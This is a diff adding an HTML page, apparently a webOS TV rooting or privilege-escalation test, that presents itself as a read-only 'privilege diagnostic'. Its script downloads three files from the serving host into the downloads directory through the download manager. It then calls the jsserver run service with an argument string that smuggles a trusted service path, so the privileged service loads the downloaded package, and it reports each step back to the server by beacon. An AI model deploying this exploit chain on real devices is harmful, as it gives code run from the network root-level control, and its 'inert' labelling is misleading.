@@ -1,0 +1,304 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>webOS 26 privilege diagnostic</title>
+<style>
+    body { background: #000; color: #eee; font-family: sans-serif; padding: 1em; }
+    h1 { font-size: 1.3em; }
+    #status { color: #9f9; }
+    #detail { color: #aaa; white-space: pre-wrap; }
+    #note { color: #777; font-size: 0.9em; }
+</style>
+</head>
+<body>
+<h1>webOS 26 privilege diagnostic</h1>
+<p>Read-only privilege check. This page installs nothing and changes no configuration.</p>
+<p id="status">Preparing&hellip;</p>
+<p id="detail"></p>
+<p id="note">The page writes three inert diagnostic files to the download directory and asks the
+privileged service to load one of them. The loaded file only reads process/identity
+information and reports the values back to the computer.</p>
+<script>
+(function () {
+    "use strict";
+
+    // URL form: /p/<token>/rootdiag.html
+    var pathParts = location.pathname.split("/");
+    var token = pathParts.length > 2 ? pathParts[2] : "";
+    var validToken = /^[0-9a-f]{32}$/.test(token);
+    var base = location.protocol + "//" + location.host + "/";
+    var payloadBase = base + "p/" + token + "/";
+    var targetDir = "/media/internal/downloads";
+    var trustedServicePath = "/usr/palm/services/com.palm.service.devmode";
+    var files = ["package.json", "services.json", "rootdiag.js"];
+    var statusEl = document.getElementById("status");
+    var detailEl = document.getElementById("detail");
+    var started = false;
+    var failed = false;
+
+    function setStatus(text, detail) {
+        statusEl.textContent = text;
+        if (typeof detail !== "undefined" && detail !== null) {
+            detailEl.textContent = String(detail).substring(0, 500);
+        }
+    }
+
+    function sendEvent(name, data) {
+        var encoded;
+        try {
+            encoded = encodeURIComponent(JSON.stringify(data || {}));
+        } catch (error) {
+            encoded = encodeURIComponent(String(data || ""));
+        }
+        try {
+            var image = new Image();
+            image.src = base + "e/" + token + "/event?event=" +
+                encodeURIComponent(name) + "&data=" + encoded + "&t=" + Date.now();
+        } catch (error) {
+            // The page is only a transport for diagnostic events; a lost
+            // beacon is handled by the computer's timeout logic.
+        }
+    }
+
+    function getBridge() {
+        var Bridge = null;
+        if (typeof webOSServiceBridge === "function") {
+            Bridge = webOSServiceBridge;
+        } else if (typeof PalmServiceBridge === "function") {
+            Bridge = PalmServiceBridge;
+        }
+        if (Bridge === null) {
+            return null;
+        }
+        return new Bridge();
+    }
+
+    function fail(stage, detail) {
+        if (failed) {
+            return;
+        }
+        failed = true;
+        setStatus("Failed: " + stage, detail);
+        sendEvent("page-error", {
+            stage: String(stage),
+            detail: String(detail || "").substring(0, 400)
+        });
+    }
+
+    function download(index) {
+        if (failed) {
+            return;
+        }
+        if (index >= files.length) {
+            setStatus("Payload files downloaded; requesting the privilege check\u2026");
+            // The server treats the three per-file confirmations as the
+            // authoritative download completion; no separate complete beacon
+            // is needed (and none could be more reliable than those reports).
+            setTimeout(requestRun, 700);
+            return;
+        }
+
+        var name = files[index];
+        var bridge = getBridge();
+        if (bridge === null) {
+            fail("bridge", "webOSServiceBridge is unavailable");
+            return;
+        }
+
+        var finished = false;
+        var watchdog = setTimeout(function () {
+            if (finished) {
+                return;
+            }
+            finished = true;
+            try { bridge.cancel(); } catch (error) {}
+            fail("download-timeout", name);
+        }, 12000);
+
+        bridge.onservicecallback = function (message) {
+            if (finished) {
+                return;
+            }
+
+            var response;
+            try {
+                response = JSON.parse(message);
+            } catch (error) {
+                finished = true;
+                clearTimeout(watchdog);
+                fail("download-response", name + ": unparsable response");
+                return;
+            }
+
+            if (!response || typeof response !== "object") {
+                finished = true;
+                clearTimeout(watchdog);
+                fail("download-response", name + ": response is not an object");
+                return;
+            }
+
+            if (response.hasOwnProperty("completed")) {
+                finished = true;
+                clearTimeout(watchdog);
+                try { bridge.cancel(); } catch (error) {}
+
+                var badStatus = (typeof response.httpStatus === "number" &&
+                    (response.httpStatus < 200 || response.httpStatus >= 300));
+                if (response.completed !== true || response.aborted === true ||
+                        response.interrupted === true || badStatus) {
+                    fail("download", name + ": " + JSON.stringify(response).substring(0, 300));
+                    return;
+                }
+
+                sendEvent("download", {
+                    file: name,
+                    ok: true,
+                    httpStatus: response.httpStatus
+                });
+                setStatus("Downloaded " + name + " (" + (index + 1) + "/" + files.length + ")");
+                setTimeout(function () { download(index + 1); }, 700);
+                return;
+            }
+
+            if (response.returnValue === false) {
+                finished = true;
+                clearTimeout(watchdog);
+                try { bridge.cancel(); } catch (error) {}
+                fail("download-rejected", name + ": " +
+                    String(response.errorText || response.error || "unknown error").substring(0, 300));
+            }
+        };
+
+        try {
+            bridge.call("luna://com.webos.service.downloadmanager/download", JSON.stringify({
+                target: payloadBase + name,
+                targetDir: targetDir,
+                targetFilename: name,
+                subscribe: true
+            }));
+        } catch (error) {
+            finished = true;
+            clearTimeout(watchdog);
+            fail("download", name + ": " + String(error && error.message ? error.message : error));
+        }
+    }
+
+    function requestRun() {
+        if (failed) {
+            return;
+        }
+
+        var bridge = getBridge();
+        if (bridge === null) {
+            fail("bridge", "webOSServiceBridge is unavailable");
+            return;
+        }
+
+        // This is the same positional trusted-path workaround used by the
+        // existing webOS 26 compatibility launcher. Only the package content
+        // in the download directory differs.
+        var payload = {
+            inputParams: "a b c " + trustedServicePath +
+                " -- /tmp/cgroup dummy " + targetDir
+        };
+
+        sendEvent("run-request", {inputParams: payload.inputParams});
+        setStatus("Service request sent; waiting for the privileged report\u2026");
+
+        var answered = false;
+        var watchdog = setTimeout(function () {
+            if (answered) {
+                return;
+            }
+            answered = true;
+            sendEvent("run-timeout", {});
+            setStatus("No service response; the result is unknown.");
+        }, 10000);
+
+        bridge.onservicecallback = function (message) {
+            if (answered) {
+                return;
+            }
+            answered = true;
+            clearTimeout(watchdog);
+            sendEvent("run", {message: String(message).substring(0, 2000)});
+            setStatus("Service response received. The computer evaluates the report.");
+        };
+
+        try {
+            bridge.call("luna://com.webos.service.jsserver/run", JSON.stringify(payload));
+        } catch (error) {
+            answered = true;
+            clearTimeout(watchdog);
+            fail("run", String(error && error.message ? error.message : error));
+        }
+    }
+
+    function start() {
+        if (started || failed) {
+            return;
+        }
+        started = true;
+        setStatus("Downloading the diagnostic package\u2026");
+        download(0);
+    }
+
+    if (!validToken) {
+        fail("token", "invalid diagnostic token in the page URL");
+        return;
+    }
+
+    var cancelBridge = getBridge();
+    if (cancelBridge === null) {
+        fail("bridge", "webOSServiceBridge is unavailable");
+        return;
+    }
+
+    setStatus("Clearing stale download-manager jobs\u2026");
+    // Start only after the Download Manager explicitly acknowledges the
+    // cancel. A timeout, rejection or unparsable response aborts the page;
+    // the acknowledgement is the only cleanup confirmation available here.
+    var cancelSettled = false;
+    var cancelWatchdog = setTimeout(function () {
+        if (cancelSettled) {
+            return;
+        }
+        cancelSettled = true;
+        fail("cancel-timeout", "cancelAllDownloads did not confirm completion");
+    }, 2500);
+
+    cancelBridge.onservicecallback = function (message) {
+        if (cancelSettled) {
+            return;
+        }
+        cancelSettled = true;
+        clearTimeout(cancelWatchdog);
+
+        var response;
+        try {
+            response = JSON.parse(message);
+        } catch (error) {
+            fail("cancel-response", "unparsable cancelAllDownloads response");
+            return;
+        }
+        if (!response || response.returnValue !== true) {
+            fail("cancel-rejected", "cancelAllDownloads was not confirmed: " +
+                String(message).substring(0, 300));
+            return;
+        }
+        sendEvent("cancel", {message: String(message).substring(0, 400)});
+        setTimeout(start, 800);
+    };
+    try {
+        cancelBridge.call("luna://com.webos.service.downloadmanager/cancelAllDownloads", "{}");
+    } catch (error) {
+        cancelSettled = true;
+        clearTimeout(cancelWatchdog);
+        fail("cancel", String(error && error.message ? error.message : error));
+        return;
+    }
+})();
+</script>
+</body>
+</html>
